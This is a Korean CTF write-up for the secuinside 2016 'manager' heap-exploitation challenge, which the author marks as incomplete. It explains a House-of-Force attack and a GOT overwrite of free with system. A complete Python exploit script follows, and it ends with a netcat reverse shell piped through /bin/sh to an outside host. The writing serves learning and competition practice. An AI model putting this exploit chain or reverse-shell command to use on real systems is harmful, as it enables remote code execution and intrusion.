---
layout: post
title: secuinside 2016 manager writeup (incomplete)
category: writeup
---

KR version

이번에는 끝까지 풀지를 못해서 ㅠㅠ flag를 얻지는 못했다.
manager 문제는 allocation simulator 역할을 하는 바이너리가 주어져있고,
힙을 조작해서 취약점을 만드는 문제이다.

분석을 해 보면, while문을 통해 16바이트짜리 쿼리를 계속 보내는 것을 알 수 있다.
|cmd len check index| (각 4바이트) 형태로 되어있고, 

check = 15

cmd = 0~5 (0 : init, 1 : write, 2 : malloc, 3 : realloc, 4 : print, 5 : free)

index = 0 ~ 9


취약점은 크게 두가지가 있다. 

1. malloc에서 길이를 구조체에 저장하는데, 실제 malloc된 크기는 4096이 아니면서 구조체에 4096을 저장할 수 있다. (buffer overwrite가능)

2. realloc에서 음수 크기가 가능하다.

두 취약점을 조합해 House-of-force 기법을 쓸 수 있다. 하지만 릭이 없어서 어디에 write를 할 지 모르는데, House-of-force는 offset을 기반으로 움직이기 때문에 힙의 앞부분으로도 덮어쓸 수 있다. 이것을 이용하여 처음의 40byte 구조체를 덮어쓰면, malloc할 때의 주소를 읽을 수 있고, heap_base를 찾을 수 있다.

heap_base와 binary base가 0x???000 정도 차이나는 것을 이용(차이는 컴퓨터마다 일정) 하여 \x7fELF가 나오는 부분을 찾아 binary base를 계산한다.

이후 free의 pointer를 system으로 바꾸고, 힙에 "nc myserver 10291 &#124; /bin/sh &#124; nc myserver 10292" 처럼 reverse shell을 만든 후 free를 해주면 완성!

```python
import pwnbox
import struct

#p = pwnbox.pipe.SocketPipe('chal.cykor.kr',22222)
p = pwnbox.pipe.SocketPipe('127.0.0.1',22222)


def query(command,length,selector):
    p.write(struct.pack("<IIII",command,length,15,selector))

def init_cell(num):
    query(0,0,num)

def set_cell_len(num,len_):
    query(2,len_,num)

def write_cell(num,data):
    query(1,0,num)
    p.write(data)

def read_cell(num):
    query(4,0,0)
    p.write(struct.pack("<I",num))

def free_cell(num):
    query(5,0,0)
    p.write(struct.pack("<I",num))

def realloc_cell(num,len_,data):
    query(3,0,0)
    p.write(struct.pack("<II",len_,num))
    p.write(data)

def fail():
    p.write("\x00"*16)

def a_read_byte(addr):
    spayload = ""
    spayload += struct.pack("<q",-1)
    spayload += struct.pack("<i",-1) # len
    spayload += struct.pack("<i",-1)
    spayload += struct.pack("<q",addr) # buf
    spayload += struct.pack("<i",-1) # cmd
    spayload += struct.pack("<i",-1) # chk
    spayload += struct.pack("<i",1) # buf_set
    spayload += struct.pack("<i",-1)
    realloc_cell(0,0x100,"\xff"*0x10 + spayload.ljust(0xf0,'\x00'))
    read_cell(3)
    p.read_until('3=> ')
    retVal = p.read_byte(1)
    if retVal == '\n' and p.read_byte(1) == '\n':
        retVal = '\x00'
    return retVal

def a_write(addr,data):
    spayload = ""
    spayload += struct.pack("<q",-1)
    spayload += struct.pack("<i",len(data)) # len
    spayload += struct.pack("<i",-1)
    spayload += struct.pack("<q",addr) # buf
    spayload += struct.pack("<i",-1) # cmd
    spayload += struct.pack("<i",-1) # chk
    spayload += struct.pack("<i",1) # buf_set
    spayload += struct.pack("<i",-1)
    realloc_cell(0,0x100,"\xff"*0x10 + spayload.ljust(0xf0,'\x00'))
    realloc_cell(3,len(data),data)


def a_read(addr,len_):
    x = ""
    for i in range(len_):
        x = x + a_read_byte(addr+i)
    return x

p.read_until('alloc manager!')

init_cell(0)
init_cell(3)
init_cell(5)
init_cell(6)
init_cell(7)
set_cell_len(5,0x180)

set_cell_len(5,4097)

write_cell(5,('A'*0x188+struct.pack("<Q",0xffffffffffffffff)).ljust(0x1000))

realloc_cell(3,4294966528,"a") # -768

#p.interact()

realloc_cell(0,0x100,"\xff"*0x20)
#write_cell(0,"\xff"*0x10+spayload.ljust(0xf0,'\x00'))

read_cell(0)
p.read_until('0=> ')
x = p.read_byte(0x20+8)

heap_base = struct.unpack('<Q',x[0x20:])[0] & 0x0000fffffffff000

print "Heap base : %x" % heap_base

bin_base = heap_base - 0x1d0b000 # in local machine

got_malloc = bin_base + 0x2040E8
got_free = bin_base + 0x204018

libc_malloc = struct.unpack("<Q",a_read(got_malloc,8))[0]

print "%x" % libc_malloc
# libc (in local machine)
libc_base = libc_malloc - 0x82750
libc_system = libc_base + 0x46640
print "%x" % libc_base
a_write(got_free, struct.pack("<Q",libc_system))

print "%x" % struct.unpack("<Q",a_read(got_free,8))[0]

a_write(heap_base+0x1000,"nc ssh.goatskin.xyz 10291 | /bin/sh | nc ssh.goatskin.xyz 10292\x00")


free_cell(3)


p.interact()
```

안타까운 점은 문제서버 libc의 malloc과 다르기 때문인지 offset이 안맞아서 서버 익스는 못했다...